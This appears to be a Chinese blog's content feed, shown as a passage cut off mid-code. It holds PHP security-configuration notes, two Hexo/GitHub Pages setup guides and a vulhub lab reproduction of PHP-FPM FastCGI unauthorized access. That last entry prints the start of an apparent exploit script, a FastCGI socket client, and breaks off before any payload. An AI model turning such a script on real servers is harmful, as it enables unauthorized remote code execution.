UID（所有者）。</td></tr><tr><td>filepro()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>filepro_rowcount()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>filepro_retrieve()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>ifx_*</td><td><a href="https://edu.aliyun.com/jiaocheng/1043">sql</a>_safe_mode 限制, (!= safe mode)</td></tr><tr><td>ingres_*</td><td>sql_safe_mode 限制, (!= safe mode)</td></tr><tr><td><a href="https://edu.aliyun.com/jiaocheng/1107">mysql</a>_*</td><td>sql_safe_mode 限制, (!= safe mode)</td></tr><tr><td>pg_loimport()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>posix_mkfifo()</td><td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>putenv()</td><td>遵循 ini 设置的 safe_mode_protected_env_vars 和 safe_mode_allowed_env_vars 选项。请参考 putenv() 函数的有关<a href="https://yq.aliyun.com/wenji">文档</a>。</td></tr><tr><td>move_uploaded_file()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>chdir()</td><td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>dl()</td><td>本函数在安全模式下被禁用。</td></tr><tr><td>backtick operator</td><td>本函数在安全模式下被禁用。</td></tr><tr><td>shell_exec()（在功能上和 backticks 函数相同）</td><td>本函数在安全模式下被禁用。</td></tr><tr><td>exec()</td><td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td></tr><tr><td>system()</td><td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td></tr><tr><td>passthru()</td><td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td></tr><tr><td>popen()</td><td>只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。</td></tr><tr><td>fopen()</td><td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>mkdir()</td><td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>rmdir()</td><td>检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>rename()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>unlink()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>copy()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 (on <code>source</code> and <code>target</code>)</td></tr><tr><td>chgrp()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>chown()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>chmod()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 另外，不能设置 SUID、SGID 和 sticky bits</td></tr><tr><td>touch()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。</td></tr><tr><td>symlink()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意：仅测试 target）</td></tr><tr><td>link()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意：仅测试 target）</td></tr><tr><td>apache_request_headers()</td><td>在安全模式下，以“authorization”（区分大小写）开头的标头将不会被返回。</td></tr><tr><td>header()</td><td>在安全模式下，如果设置了 WWW-Authenticate，当前脚本的 uid 将被添加到该标头的 realm 部分。</td></tr><tr><td>PHP_AUTH 变量</td><td>在安全模式下，变量 <code>PHP_AUTH_USER</code>、<code>PHP_AUTH_PW</code> 和 <code>PHP_AUTH_TYPE</code> 在 <code>$_SERVER</code> 中不可用。但无论如何，您仍然可以使用 <code>REMOTE_USER</code> 来获取用户名称（USER）。（注意：仅 PHP 4.3.0 以后有效）</td></tr><tr><td>highlight_file(), show_source()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意，仅在 4.2.1 版本后有效）</td></tr><tr><td>parse_ini_file()</td><td>检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。 （注意，仅在 4.2.1 版本后有效）</td></tr><tr><td>set_time_limit()</td><td>在安全模式下不起作用。</td></tr><tr><td>max_execution_time</td><td>在安全模式下不起作用。</td></tr><tr><td>mail()</td><td>在安全模式下，第五个参数被屏蔽。（注意，仅自 PHP 4.2.3 起受影响）</td></tr></tbody></table><p>以及部分PHP扩展中的函数</p><p><strong>版本</strong>：PHP5.4&gt;=被废除，配置范围是PHP_INI_SYSTEM</p></li></ol></li><li><p>open_basedir PHP可访问目录</p><p>用来限制PHP只能访问哪些目录。注意：其限制是前缀，如：open_basedir=/www/a 那么目录 /www/ab 可以访问。使用 open_basedir=/www/a/ 时只能访问该目录了</p><p><strong>版本</strong>：&lt;PHP5.2.3时配置范围：PHP_INI_SYSTEM。&gt;=PHP5.2.3配置范围是PHP_INI_ALL</p></li><li><p>disable_functions(禁用函数)</p><p>禁止一些敏感函数的使用，切记把dl()函数也加到禁止列表，因为dl()函数可以加载自定义的PHP扩展以突破disable_functions指令的限制。</p><p><strong>版本</strong>：配置范围为php.ini only</p></li><li><p>display_errors和error_reporting错误显示</p><p>display_errors表明是否显示PHP脚本内部错误的选项，当开启之后再开启error_reporting可以配置错误显示的级别</p><p><strong>版本</strong>：配置范围为PHP_INI_ALL</p></li><li><p>其他创建指令及说明</p><table><thead><tr><th>指令</th><th>可配置范围</th><th align="left">说明</th></tr></thead><tbody><tr><td>safe_mode_gid</td><td>PHP_INI_SYSTEM</td><td align="left">以安全模式打开文件时默认使用UID来比对；设置本指令为on时使用GID做宽松的对比</td></tr><tr><td>expose_php</td><td>php.ini only</td><td align="left">是否在服务器返回信息HTTP头显示PHP版本</td></tr><tr><td>max_execution_time</td><td>PHP_INI_ALL</td><td align="left">每个脚本最多执行秒数</td></tr><tr><td>memory_limit</td><td>PHP_INI_ALL</td><td align="left">每个脚本能够使用的最大内存数量</td></tr><tr><td>log_errors</td><td>PHP_INI_ALL</td><td align="left">将错误输入到日志文件</td></tr><tr><td>log_errors_max_len</td><td>PHP_INI_ALL</td><td align="left">设定log_errors的最大长度</td></tr><tr><td>variables_order</td><td>PHP_INI_PERDIR</td><td align="left">此指令描述了PHP注册GET、POST、Cookie、环境和内置变量的顺序，注册使用从左往右的顺序，新的值会覆盖就的值</td></tr><tr><td>post_max_size</td><td>PHP_INI_PERDIR</td><td align="left">PHP可以接受的最大的POST数据大小</td></tr><tr><td>auto_prepend_file</td><td>PHP_INI_PERDIR</td><td align="left">在任何PHP文档之前自动包含的文件</td></tr><tr><td>auto_append_file</td><td>PHP_INI_PERDIR</td><td align="left">在任何PHP文档之后自动包含的文件</td></tr><tr><td>extension_dir</td><td>PHP_INI_SYSTEM</td><td align="left">可加载的扩展(模块)的目录位置</td></tr><tr><td>file_uploads</td><td>PHP_INI_SYSTEM</td><td align="left">是否允许HTTP文件上传</td></tr><tr><td>upload_tmp_dir</td><td>PHP_INI_SYSTEM</td><td align="left">对于HTTP上传文件的临时文件目录</td></tr><tr><td>upload_max_filesize</td><td>PHP_INI_SYSTEM</td><td align="left">允许上传的最大文件大小</td></tr></tbody></table></li></ol></li></ol><h2 id="第二章-审计辅助与漏洞验证工具"><a href="#第二章-审计辅助与漏洞验证工具" class="headerlink" title="第二章 审计辅助与漏洞验证工具"></a>第二章 审计辅助与漏洞验证工具</h2><h3 id="2-1-代码编辑器"><a href="#2-1-代码编辑器" class="headerlink" title="2.1 代码编辑器"></a>2.1 代码编辑器</h3><ol><li>Notepad++ <a href="https://notepad-plus.en.softonic.com/">下载地址</a></li><li>UltraEdit(收费)</li><li>Zend Studio</li></ol><h3 id="2-2-代码审计工具"><a href="#2-2-代码审计工具" class="headerlink" title="2.2 代码审计工具"></a>2.2 代码审计工具</h3><ol><li>Seay源代码审计系统<a href="https://github.com/f1tz/cnseay">下载地址</a></li><li>Fortify SCA(商业软件)</li><li>RIPS</li></ol><h3 id="2-3-漏洞验证辅助"><a href="#2-3-漏洞验证辅助" class="headerlink" title="2.3 漏洞验证辅助"></a>2.3 漏洞验证辅助</h3><ol><li><p>Burp Suite</p></li><li><p>浏览器扩展</p><p>此处作者推荐了以下插件</p><ol><li>HackBar 可对URL、POST及Referer的参数设置</li><li>firebug(目前没有了)</li><li>Modify 同样是修改Request中的HTTP Header的字段，但是它是做的全局修改</li></ol></li><li><p>加密解密转换工具</p><p>超级加解密转化工具 <a href="http://www.xitongzhijia.net/soft/5343.html">下载地址</a></p></li><li><p>正则调试工具</p><p>灵者正则调试 <a href="https://www.jb51.net/softs/553350.html">下载地址</a></p></li><li><p>SQL执行监控工具</p><p>Seay源代码审计系统中带有</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 代码审计：企业级Web代码安全架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Github+Hexo</title>
    <link href="/2021/07/10/Git/Github+Hexo/"/>
    <url>/2021/07/10/Git/Github+Hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="利用Hexo配置github博客"><a href="#利用Hexo配置github博客" class="headerlink" title="利用Hexo配置github博客"></a>利用Hexo配置github博客</h1><p><strong>建议全程使用git命令行</strong></p><h1 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h1><ol><li><p>需要安装git</p></li><li><p>需要安装node.js</p></li><li><p>利用node.js安装</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install -g hexo<br></code></pre></div></td></tr></table></figure></li></ol><h1 id="Hexo设置"><a href="#Hexo设置" class="headerlink" title="Hexo设置"></a>Hexo设置</h1><ol><li><p>创建对应的文件夹</p></li><li><p>进入文件夹后启动git命令行</p></li><li><p>进行基础的配置</p><p>输入命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo init <span class="hljs-comment">#初始化</span><br>hexo g <span class="hljs-comment"># 生成相关html文件</span><br>hexo s <span class="hljs-comment"># 本地预览</span><br></code></pre></div></td></tr></table></figure></li><li><p>上传到github</p><p>hexo上传很简单但是需要想进行部分设置</p><p>首先需要配置好ssh key，其次是hexo生成的__config.yml中关于deploy部分</p><figure class="highlight yml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository:</span> <span class="hljs-string">git@github.com:账户名/库名.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">gh-pages</span><br></code></pre></div></td></tr></table></figure><p>之后再安装对应的插件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></div></td></tr></table></figure><p>最后使用命令上传即可</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo d<br></code></pre></div></td></tr></table></figure></li><li><p>保留部分文件</p><p>由于直接提交代码后，会清除原本的其他代码</p><p>所以需要进行设置在public里面添加对应的CNAME文件等</p><p>之后使用命令上传即可</p></li><li><p>附加hexo常见命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo new <span class="hljs-string">&quot;postName&quot;</span> <span class="hljs-comment">#新建文章</span><br>hexo new page <span class="hljs-string">&quot;pageName&quot;</span> <span class="hljs-comment">#新建页面</span><br>hexo generate <span class="hljs-comment">#生成静态页面至public目录</span><br>hexo server <span class="hljs-comment">#开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span><br>hexo deploy <span class="hljs-comment">#部署到GitHub</span><br>hexo <span class="hljs-built_in">help</span>  <span class="hljs-comment"># 查看帮助</span><br>hexo version  <span class="hljs-comment">#查看Hexo的版本</span><br></code></pre></div></td></tr></table></figure><p>只添加后命令的首字母就是缩写</p></li><li><p>对应的md设置</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">---<br>title: postName #文章页面上的显示名称，一般是中文<br>date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改<br>categories: 默认分类 #分类<br>tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格<br><span class="hljs-section">description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面</span><br><span class="hljs-section">---</span><br>正文<br></code></pre></div></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub</tag>
      
      <tag>hexo</tag>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客创建</title>
    <link href="/2021/07/10/Git/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/"/>
    <url>/2021/07/10/Git/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="博客创建"><a href="#博客创建" class="headerlink" title="博客创建"></a>博客创建</h1><h1 id="git库设置"><a href="#git库设置" class="headerlink" title="git库设置"></a>git库设置</h1><h2 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h2><p>首先进入该界面</p><p><img src="https://pic.imgdb.cn/item/60eac8275132923bf8bca56e.png"></p><p>之后按照相关信息进行填写</p><p><img src="https://pic.imgdb.cn/item/60eac8305132923bf8bcc7b2.png"></p><p>之后进行点击Settings并选择Github Pages</p><p>选择一个github官方提供的主题</p><p><img src="https://pic2.zhimg.com/80/v2-e47b645a6f0adbb533afb9ac85939a87_720w.jpg?source=1940ef5c"></p><p>随意选择一个之后就可以进行访问了，访问地址是：github用户名.github.io/创建的库名</p><h1 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h1><p>在库中添加CNAME文件，并在内容中添加自己的域名。</p><p>之后对域名进行设置，  使用cname模式绑定访问地址，设置两条解析。主机记录分别为@和www</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub</tag>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP-FPM Fastcgi未授权访问扩展</title>
    <link href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP-FPM%20Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%89%A9%E5%B1%95/"/>
    <url>/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP-FPM%20Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%89%A9%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-FPM-Fastcgi未授权访问扩展"><a href="#PHP-FPM-Fastcgi未授权访问扩展" class="headerlink" title="PHP-FPM Fastcgi未授权访问扩展"></a>PHP-FPM Fastcgi未授权访问扩展</h1><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">相关漏洞讲解</a><br><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">相关工具(py)</a><br>环境搭建</p><div class="hljs code-wrapper"><pre><code>cd vulhub/php/fpmdocker-compose up -d</code></pre></div><p>脚本代码：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bchr</span>(<span class="hljs-params">i</span>):</span><br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bord</span>(<span class="hljs-params">c</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">force_bytes</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">force_text</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastCGIClient</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):</span><br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__connect</span>(<span class="hljs-params">self</span>):</span><br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):</span><br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>               + bchr(fcgi_type) \<br>               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               